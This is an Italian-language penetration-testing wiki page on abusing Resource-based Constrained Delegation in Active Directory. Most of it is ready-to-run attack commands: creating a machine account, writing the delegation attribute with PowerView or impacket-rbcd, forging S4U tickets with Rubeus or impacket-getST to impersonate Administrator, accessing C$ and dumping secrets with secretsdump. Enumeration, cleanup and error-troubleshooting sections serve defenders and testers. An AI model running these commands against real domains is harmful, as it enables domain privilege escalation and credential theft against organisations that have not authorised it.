# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Nozioni di base su Resource-based Constrained Delegation

Questo è simile alla [Constrained Delegation](constrained-delegation.md) di base ma **invece** di dare permessi a un **object** per **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.

In questo caso, l'oggetto vincolato avrà un attributo chiamato _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con il nome dell'utente che può impersonare qualsiasi altro utente contro di esso.

Un'altra differenza importante rispetto a questa Constrained Delegation e le altre delegazioni è che qualsiasi utente con **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) può impostare **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (nelle altre forme di Delegation servivano privilegi di domain admin).

### Nuovi concetti

Nel contesto della Constrained Delegation si è detto che il flag **`TrustedToAuthForDelegation`** dentro il valore _userAccountControl_ dell'utente è necessario per eseguire una **S4U2Self.** Ma non è del tutto vero.  
La realtà è che anche senza quel valore puoi eseguire una **S4U2Self** contro qualsiasi utente se sei un **service** (hai uno SPN), però se **hai `TrustedToAuthForDelegation`** il TGS restituito sarà **Forwardable** e se **non hai** quel flag il TGS restituito **non sarà** **Forwardable**.

Tuttavia, se il **TGS** usato in **S4U2Proxy** è **NOT Forwardable**, provare ad abusare di una **basic Constrain Delegation** **non funzionerà**. Ma se stai cercando di sfruttare una **Resource-Based constrain delegation**, funzionerà.

### Struttura dell'attacco

> Se hai **write equivalent privileges** su un account **Computer** puoi ottenere **privileged access** su quella macchina.

Supponiamo che l'attaccante abbia già **write equivalent privileges over the victim computer**.

1. L'attaccante **compromette** un account che ha uno **SPN** o **ne crea uno** (“Service A”). Nota che **qualsiasi** _Admin User_ senza altri privilegi speciali può **creare** fino a 10 oggetti Computer (**_MachineAccountQuota_**) e assegnargli uno **SPN**. Quindi l'attaccante può semplicemente creare un oggetto Computer e impostare uno SPN.
2. L'attaccante **abusa del suo WRITE privilege** sull'host vittima (ServiceB) per configurare **resource-based constrained delegation to allow ServiceA to impersonate any user** contro quell'host vittima (ServiceB).
3. L'attaccante usa Rubeus per eseguire un **full S4U attack** (S4U2Self e S4U2Proxy) da Service A a Service B per un utente **with privileged access to Service B**.
1. S4U2Self (dall'account SPN compromesso/creato): Richiedi un **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Usa il **not Forwardable TGS** del passo precedente per richiedere un **TGS** da **Administrator** al **victim host**.
3. Anche se stai usando un TGS non Forwardable, poiché stai sfruttando Resource-based constrained delegation, funzionerà.
4. L'attaccante può eseguire **pass-the-ticket** e **impersonate** l'utente per ottenere **access to the victim ServiceB**.

Per verificare il valore di _**MachineAccountQuota**_ del dominio puoi usare:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attacco

### Creazione di un oggetto computer

Puoi creare un oggetto computer all'interno del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurazione di Resource-based Constrained Delegation

**Uso del modulo PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Uso di powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Eseguire un attacco S4U completo (Windows/Rubeus)

Prima di tutto, abbiamo creato il nuovo oggetto Computer con la password `123456`, quindi abbiamo bisogno dell'hash di quella password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Questo stamperà gli hash RC4 e AES per quell'account.\
Ora, l'attack può essere eseguito:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puoi generare più tickets per più servizi chiedendo una sola volta usando il parametro `/altservice` di Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Nota che gli utenti hanno un attributo chiamato "**Cannot be delegated**". Se un utente ha questo attributo impostato su True, non potrai impersonarlo. Questa proprietà può essere vista all'interno di bloodhound.

### Strumenti Linux: RBCD end-to-end con Impacket (2024+)

Se operi da Linux, puoi eseguire l'intera catena RBCD utilizzando gli strumenti ufficiali Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Note
- Se LDAP signing/LDAPS è forzato, usa `impacket-rbcd -use-ldaps ...`.
- Preferisci chiavi AES; molti domini moderni limitano RC4. Impacket e Rubeus supportano entrambi AES-only flows.
- Impacket può riscrivere il `sname` ("AnySPN") per alcuni strumenti, ma ottieni lo SPN corretto quando possibile (es., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Accesso

L'ultima riga di comando eseguirà l'**attacco S4U completo e inietterà il TGS** da Administrator all'host vittima **in memoria**.\
In questo esempio è stato richiesto un TGS per il servizio **CIFS** da Administrator, quindi potrai accedere a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusare di diversi service tickets

Scopri gli [**available service tickets here**](silver-ticket.md#available-services).

## Enumerazione, auditing e pulizia

### Enumerare i computer con RBCD configurato

PowerShell (decodificando la SD per risolvere gli SID):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (leggi o svuota con un solo comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Pulizia / ripristino di RBCD

- PowerShell (cancella l'attributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Errori di Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Questo significa che Kerberos è configurato per non usare DES o RC4 e stai fornendo solo l'hash RC4. Fornisci a Rubeus almeno l'hash AES256 (o semplicemente rc4, aes128 e aes256). Esempio: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Questo significa che l'orologio del computer corrente è diverso da quello del DC e Kerberos non funziona correttamente.
- **`preauth_failed`**: Questo significa che lo username + gli hash forniti non funzionano per l'accesso. Potresti aver dimenticato di inserire il "$" all'interno dello username quando hai generato gli hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Questo può significare:
  - L'utente che stai cercando di impersonare non può accedere al servizio desiderato (perché non puoi impersonarlo o perché non ha privilegi sufficienti)
  - Il servizio richiesto non esiste (se richiedi un ticket per winrm ma winrm non è in esecuzione)
  - Il fakecomputer creato ha perso i suoi privilegi sul server vulnerabile e devi ridarglieli.
  - Stai abusando del classico KCD; ricorda che RBCD funziona con ticket S4U2Self non-forwardable, mentre KCD richiede forwardable.

## Note, relays e alternative

- Puoi anche scrivere la SD RBCD tramite AD Web Services (ADWS) se LDAP è filtrato. Vedi:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Le catene di relay Kerberos terminano frequentemente in RBCD per ottenere SYSTEM locale in un solo passaggio. Vedi esempi pratici end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Se LDAP signing/channel binding sono **disabilitati** e puoi creare un account macchina, strumenti come **KrbRelayUp** possono relè (relay) un'autenticazione Kerberos forzata a LDAP, impostare `msDS-AllowedToActOnBehalfOfOtherIdentity` per il tuo account macchina sull'oggetto computer target e impersonare immediatamente **Administrator** via S4U da off-host.

## Riferimenti

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (ufficiale): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
